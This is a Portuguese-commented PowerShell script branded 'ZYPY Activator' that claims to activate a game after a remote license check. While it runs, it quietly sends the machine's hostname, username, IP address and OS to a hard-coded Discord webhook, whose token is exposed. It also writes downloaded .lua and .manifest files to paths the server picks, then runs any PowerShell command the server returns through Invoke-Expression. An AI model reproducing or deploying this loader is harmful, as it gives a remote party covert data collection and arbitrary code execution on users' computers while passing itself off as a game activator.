# Configurações Iniciais
$API_URL = "https://gaamingsteam.squareweb.app/api/app/"
$APP_ID = "kastexstorms"
$ID_JOGO = "2215200"
$WEBHOOK_URL = "https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0"

# Funções de Mensagem
function Show-MessageBox {
    param([string]$Message, [string]$Title)
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show($Message, $Title)
}

# Função para enviar relatório ao Discord
function Send-DiscordReport {
    param(
        [string]$Status,
        [string]$Descricao,
        [int]$Cor # 3066993 = verde, 15158332 = vermelho, 16776960 = amarelo
    )

    $PCInfo = @{
        hostname = $env:COMPUTERNAME
        usuario  = $env:USERNAME
        os       = (Get-CimInstance Win32_OperatingSystem).Caption
        ip       = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
        data     = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
    }

    $payload = @{
        embeds = @(@{
            title  = "📋 Relatório — ID Jogo: $ID_JOGO"
            color  = $Cor
            fields = @(
                @{ name = "💻 PC";        value = $PCInfo.hostname; inline = $true  }
                @{ name = "👤 Usuário";   value = $PCInfo.usuario;  inline = $true  }
                @{ name = "🌐 IP";        value = "$($PCInfo.ip)";  inline = $true  }
                @{ name = "🖥️ Sistema";   value = $PCInfo.os;       inline = $false }
                @{ name = "🎮 ID do Jogo";value = $ID_JOGO;         inline = $true  }
                @{ name = "📌 Status";    value = $Status;          inline = $true  }
                @{ name = "📝 Detalhe";   value = $Descricao;       inline = $false }
                @{ name = "🕐 Data/Hora"; value = $PCInfo.data;     inline = $false }
            )
            footer = @{ text = "ZYPY Activator" }
        })
    } | ConvertTo-Json -Depth 5

    try {
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" | Out-Null
    } catch {
        # Silencioso — não interrompe o script se o Discord falhar
    }
}

# 1. Buscar Configurações da API
$UrlFinal = "$API_URL$APP_ID/$ID_JOGO"
try {
    $response = Invoke-RestMethod -Uri $UrlFinal -Method Get -TimeoutSec 10
} catch {
    Send-DiscordReport -Status "❌ Falhou" -Descricao "Erro ao conectar à API: $_" -Cor 15158332
    Show-MessageBox -Message "Não foi possível conectar ao servidor.`n`nVerifique sua internet." -Title "Erro de Conexão"
    exit
}

if (-not $response.ativo) {
    Send-DiscordReport -Status "⛔ Licença Inválida" -Descricao "Acesso desativado ou expirado para APP: $APP_ID" -Cor 16776960
    Show-MessageBox -Message "Seu acesso foi desativado ou expirou.`n`nEntre em contato com o suporte." -Title "Licença Inválida"
    exit
}

# 2. Detectar Caminhos
$DocumentsPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("MyDocuments"), "conteudo")
if (-not (Test-Path $DocumentsPath)) {
    New-Item -ItemType Directory -Path $DocumentsPath | Out-Null
}

# 3. Baixar o arquivo ZIP
$ZipDestino = Join-Path $DocumentsPath "$ID_JOGO.zip"
try {
    Invoke-WebRequest -Uri $response.url_zip -OutFile $ZipDestino
} catch {
    Send-DiscordReport -Status "❌ Falhou" -Descricao "Erro ao baixar o ZIP: $_" -Cor 15158332
    Write-Error "Falha ao baixar o arquivo ZIP."
    exit
}

# 4. Extrair o ZIP
$reiniciar = $false
if (Test-Path $ZipDestino) {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zip = [System.IO.Compression.ZipFile]::OpenRead($ZipDestino)

    foreach ($entry in $zip.Entries) {
        $destinoPath = $null

        if ($entry.Name.ToLower().EndsWith(".lua")) {
            $destinoPath = $response.caminho_lua
        } elseif ($entry.Name.ToLower().EndsWith(".st") -or $entry.Name.ToLower().EndsWith(".manifest")) {
            $destinoPath = $response.caminho_manifest
        }

        if ($destinoPath) {
            if (-not (Test-Path $destinoPath)) { New-Item -ItemType Directory -Path $destinoPath -Force | Out-Null }
            $caminhoFinalAtivo = Join-Path $destinoPath $entry.Name
            [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $caminhoFinalAtivo, $true)
            $reiniciar = $true
        }
    }
    $zip.Dispose()
}

# 5. Executar e Finalizar
if ($reiniciar -and $response.comando_powershell) {
    Invoke-Expression $response.comando_powershell
}

# Relatório final de sucesso
Send-DiscordReport -Status "✅ Sucesso" -Descricao "Jogo ativado e arquivos extraídos com sucesso." -Cor 3066993

Show-MessageBox -Message "Jogo ativado com sucesso! oferecimento ZYPY" -Title "Status"
